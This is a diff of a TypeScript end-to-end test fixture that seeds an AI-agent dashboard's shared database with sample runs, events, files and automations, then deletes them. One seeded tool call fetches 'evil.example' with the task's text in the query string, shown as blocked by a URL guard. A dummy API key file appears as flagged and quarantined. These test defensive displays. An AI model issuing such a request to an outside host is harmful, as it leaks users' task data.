@@ -1,10 +1,12 @@
 import { neon } from "@neondatabase/serverless";
 
 // The flow tests need runs in shapes the seed does not have (a v2 verdict, a follow-up, a flagged step, a stopped
-// guard, a live run, a stopped run), so they insert their own. Every one is named "[e2e] home ..." and deleted
+// guard, a live run, a stopped run, a failed run, an older stored verdict, a run of an automation), so they insert
+// their own. Every run is named "[e2e] home ...", the one automation "[e2e] home audit", and all are deleted
 // afterwards: the database is shared with the other packages and with the demo.
 const PREFIX = "[e2e] home";
-const WORKSPACE = "demo-workspace"; // the seeded demo workspace, which the dev server's session resolves to
+const COMMAND = "e2e-home-audit";
+const WORKSPACE = "demo-workspace"; // the seeded demo workspace, which the demo user's session resolves to
 const MODEL = "claude-sonnet-4-5";
 
 function client() {
@@ -13,12 +15,17 @@ function client() {
   return neon(process.env.DATABASE_URL!);
 }
 
-export type HomeRuns = { parent: string; followUp: string; live: string; stopped: string };
+export type HomeRuns = { parent: string; followUp: string; live: string; stopped: string; failed: string; legacy: string; audit: string; automation: string };
+export const AUTOMATION = { name: `${PREFIX} audit`, command: COMMAND, input: "Acme Ltd" }; // a draft
+export const READY = { name: `${PREFIX} ready check`, command: "e2e-home-ready", hint: "The registered name, e.g. Acme Ltd" };
 export const TITLES = {
   parent: `${PREFIX} parent: list three facts about the Moon`,
   followUp: `${PREFIX} follow-up: add the Moon's distance from Earth`,
   live: `${PREFIX} live: count to three slowly`,
   stopped: `${PREFIX} stopped: summarise the week's AI news`,
+  failed: `${PREFIX} failed: fetch a page that is not there`,
+  legacy: `${PREFIX} legacy: a run checked by the first version`,
+  audit: `${PREFIX} audit run: audit Acme Ltd, ownership and filings`, // the filled template: not what the title shows
 };
 
 const PLAN = (running: number | null) => ({
@@ -42,6 +49,8 @@ const CHECKS = [
 
 // A v1 verdict: no path, no decidedBy. The Why? block has to work them out.
 const V1_PASS = { verdict: "pass", checks: CHECKS, judgment: { answeredQuery: 0.93, followedPlan: 0.9 }, review: null, reasons: [], evaluatedAt: new Date().toISOString() };
+// The first version's stored shape (score and reason, no judgment): it no longer parses as a Verdict, but its headline does.
+const LEGACY = { verdict: "pass", score: 0.9, checks: CHECKS.slice(0, 2), reason: "Every check passed." };
 // A v2 verdict that went all the way to the reviewer.
 const V2_NOTES = {
   verdict: "pass_with_notes",
@@ -54,56 +63,80 @@ const V2_NOTES = {
   path: ["checks", "judge", "review"],
 };
 
-const SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="60"><rect width="120" height="60" fill="#10b981"/></svg>';
+const SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="60"><rect width="120" height="60" fill="#15845a"/></svg>';
+const CSV = "name,email\nA,a@x.example\nB,b@x.example\nC,c@x.example\n";
+const REPORT = ["The Moon is 238,855 miles from Earth on average.", "", "| Measure | Value |", "|---|---|", "| Distance | 238,855 miles |", "| Diameter | 2,159 miles |"].join("\n");
 
 export async function createHomeRuns(): Promise<HomeRuns> {
   await deleteHomeRuns(); // a crashed earlier run may have left its rows behind
   const sql = client();
-  const insert = async (row: { prompt: string; status: string; minutesAgo: number; purpose?: string; parent?: string; verdict?: unknown; report?: string; human?: string }) => {
+  const insert = async (row: { prompt: string; status: string; minutesAgo: number; purpose?: string; parent?: string; verdict?: unknown; report?: string; human?: string; error?: string; automation?: string; input?: string }) => {
     const [r] = await sql.query(
-      `insert into runs (workspace_id, created_by, purpose, parent_run_id, prompt, status, model, report, verdict, human_verdict, created_at, finished_at, num_turns, duration_ms, cost_usd)
-       values ($1, 'demo-user', $2, $3, $4, $5, $6, $7, $8::jsonb, $9, now() - make_interval(mins => $10), $11, 4, 42000, 0.12) returning id`,
+      `insert into runs (workspace_id, created_by, purpose, parent_run_id, prompt, status, model, report, verdict, human_verdict, error, automation_id, automation_version, input, created_at, finished_at, num_turns, duration_ms, cost_usd)
+       values ($1, 'demo-user', $2, $3, $4, $5, $6, $7, $8::jsonb, $9, $10, $11, $12, $13, now() - make_interval(mins => $14), $15, 4, 42000, 0.12) returning id`,
       [WORKSPACE, row.purpose ?? "adhoc", row.parent ?? null, row.prompt, row.status, MODEL, row.report ?? null,
-        row.verdict ? JSON.stringify(row.verdict) : null, row.human ?? null, row.minutesAgo,
+        row.verdict ? JSON.stringify(row.verdict) : null, row.human ?? null, row.error ?? null, row.automation ?? null, row.automation ? 1 : null, row.input ?? null, row.minutesAgo,
         row.status === "running" ? null : new Date(Date.now() - (row.minutesAgo - 1) * 60_000).toISOString()],
     );
     return r.id as string;
   };
   const events = async (runId: string, list: { kind: string; payload: unknown }[]) => {
-    for (const [seq, e] of list.entries())
-      await sql.query("insert into run_events (run_id, seq, kind, payload) values ($1, $2, $3, $4::jsonb)", [runId, seq, e.kind, JSON.stringify(e.payload)]);
+    for (const [i, e] of list.entries())
+      await sql.query("insert into run_events (run_id, seq, kind, payload) values ($1, $2, $3, $4::jsonb)", [runId, i + 1, e.kind, JSON.stringify(e.payload)]);
   };
   const file = (runId: string, name: string, mime: string, content: string, extra: { encoding?: string; flags?: unknown[]; quarantined?: boolean } = {}) =>
     sql.query("insert into files (run_id, name, mime, bytes, content, encoding, flags, quarantined) values ($1, $2, $3, $4, $5, $6, $7::jsonb, $8)", [
       runId, name, mime, Buffer.byteLength(content), content, extra.encoding ?? "utf8", JSON.stringify(extra.flags ?? []), extra.quarantined ?? false,
     ]);
-  const started = { kind: "started", payload: { model: MODEL, tools: ["WebSearch"], mcp_servers: [] } };
+  // the built-in servers are in the started event as the engine records them: they must not read as connections
+  const started = { kind: "started", payload: { model: MODEL, tools: ["WebSearch"], mcp_servers: [{ name: "plan", status: "connected" }, { name: "outputs", status: "connected" }] } };
   const finished = (subtype = "success", isError = false) => ({
     kind: "finished",
     payload: { subtype, is_error: isError, num_turns: 4, duration_ms: 42000, total_cost_usd: 0.12, result: "The Moon is 238,855 miles away." },
   });
+  const call = (id: string, name: string, input: unknown) => ({ kind: "tool_call", payload: { tool_use_id: id, name, input } });
 
-  const parent = await insert({ prompt: TITLES.parent, status: "succeeded", minutesAgo: 4, verdict: V1_PASS, report: "Three facts about the **Moon**." });
+  const [auto] = await sql.query(
+    `insert into automations (workspace_id, created_by, name, command, description, input_label, input_hint, input_example, template, status)
+     values ($1, 'demo-user', $2, $3, 'Audits a company', 'Company name', 'The registered name, e.g. Acme Ltd', 'Acme Ltd', $4::jsonb, 'draft') returning id`,
+    [WORKSPACE, AUTOMATION.name, COMMAND, JSON.stringify({ instructions: "Audit {input}: ownership and filings", intent: "", expectedOutputs: ["audit.md about {input}"], outputFormat: "", steps: ["Search"], connections: [] })],
+  );
+  const automation = auto.id as string;
+  // a ready one too, so the command list has something known to offer; the tests never run it
+  await sql.query(
+    `insert into automations (workspace_id, created_by, name, command, description, input_label, input_hint, input_example, template, status, approved_at)
+     values ($1, 'demo-user', $2, $3, 'Checks a company', 'Company name', 'The registered name, e.g. Acme Ltd', 'Acme Ltd', $4::jsonb, 'active', now())`,
+    [WORKSPACE, READY.name, READY.command, JSON.stringify({ instructions: "Check {input}", intent: "", expectedOutputs: ["check.md about {input}"], outputFormat: "", steps: ["Search"], connections: [] })],
+  );
+
+  const parent = await insert({ prompt: TITLES.parent, status: "succeeded", minutesAgo: 8, verdict: V1_PASS, report: "Three facts about the **Moon**." });
   await events(parent, [started, { kind: "plan", payload: PLAN(null) }, finished()]);
 
-  const followUp = await insert({
-    prompt: TITLES.followUp, status: "succeeded", minutesAgo: 3, purpose: "followup", parent, verdict: V2_NOTES, human: "approved",
-    report: "The Moon is 238,855 miles from Earth on average.",
-  });
+  const legacy = await insert({ prompt: TITLES.legacy, status: "succeeded", minutesAgo: 7, verdict: LEGACY, report: "Done." });
+  await events(legacy, [started, { kind: "plan", payload: PLAN(null) }, finished()]);
+
+  const audit = await insert({ prompt: TITLES.audit, status: "succeeded", minutesAgo: 6, purpose: "automation", automation, input: AUTOMATION.input, verdict: V1_PASS, report: "Acme Ltd is owned by ..." });
+  await events(audit, [started, { kind: "plan", payload: PLAN(null) }, finished()]);
+
+  const failed = await insert({ prompt: TITLES.failed, status: "failed", minutesAgo: 5, error: "error_during_execution: the page returned 404" });
+  await events(failed, [started, { kind: "plan", payload: PLAN(1) }, finished("error_during_execution", true)]);
+
+  const followUp = await insert({ prompt: TITLES.followUp, status: "succeeded", minutesAgo: 4, purpose: "followup", parent, verdict: V2_NOTES, human: "approved", report: REPORT });
   await events(followUp, [
     started,
     { kind: "plan", payload: PLAN(null) },
-    { kind: "tool_call", payload: { tool_use_id: "t1", name: "WebFetch", input: { url: "https://evil.example/?q=the-task-text" } } },
-    { kind: "guard", payload: { guard: "url", tool: "WebFetch", decision: "blocked", reason: "the query string carries the task's text", target: "evil.example" } },
+    call("t1", "WebFetch", { url: "https://evil.example/?q=the-task-text" }),
+    { kind: "guard", payload: { guard: "url", tool: "WebFetch", decision: "blocked", reason: "This address looks like it carries the task's data to another site. Leave the data out of the address.", target: "evil.example" } },
     { kind: "guard", payload: { guard: "path", tool: "Read", decision: "allowed", reason: "inside the run directory" } },
     { kind: "check", payload: { stepIndex: 1, onTrack: 0.3, note: "It found two facts, not three." } },
     { kind: "check", payload: { stepIndex: 0, onTrack: 0.9, note: "Searched as planned." } },
+    call("t2", "Write", { file_path: "/tmp/run/contacts.csv", content: CSV }),
+    call("t3", "mcp__outputs__make_chart", { file: "chart.svg", title: "Distance", kind: "bar", x: "k", y: "v", data: [{ k: "a", v: 1 }] }),
+    call("t4", "mcp__outputs__make_spreadsheet", { file: "table.xlsx", sheets: [{ name: "Measures", columns: ["measure", "value"], rows: [["Distance", 238855], ["Diameter", 2159]] }] }),
     finished(),
   ]);
   await file(followUp, "chart.svg", "image/svg+xml", SVG);
-  await file(followUp, "contacts.csv", "text/csv", "name,email\nA,a@x.example\nB,b@x.example\nC,c@x.example\n", {
-    flags: [{ kind: "email", count: 3, detail: "3 email addresses" }],
-  });
+  await file(followUp, "contacts.csv", "text/csv", CSV, { flags: [{ kind: "email", count: 3, detail: "3 email addresses" }] });
   await file(followUp, "keys.txt", "text/plain", "API_KEY=sk-test-not-a-real-key", {
     flags: [{ kind: "credential", count: 1, detail: "an API key on line 1" }],
     quarantined: true,
@@ -116,7 +149,7 @@ export async function createHomeRuns(): Promise<HomeRuns> {
   const live = await insert({ prompt: TITLES.live, status: "running", minutesAgo: 1 });
   await events(live, [started, { kind: "plan", payload: PLAN(1) }]);
 
-  return { parent, followUp, live, stopped };
+  return { parent, followUp, live, stopped, failed, legacy, audit, automation };
 }
 
 export async function deleteHomeRuns(): Promise<void> {
@@ -125,4 +158,5 @@ export async function deleteHomeRuns(): Promise<void> {
   await sql.query(`delete from run_events where run_id in (${ids})`);
   await sql.query(`delete from files where run_id in (${ids})`);
   await sql.query(`delete from runs where prompt like '${PREFIX}%'`);
+  await sql.query("delete from automations where workspace_id = $1 and command in ($2, $3)", [WORKSPACE, COMMAND, READY.command]);
 }
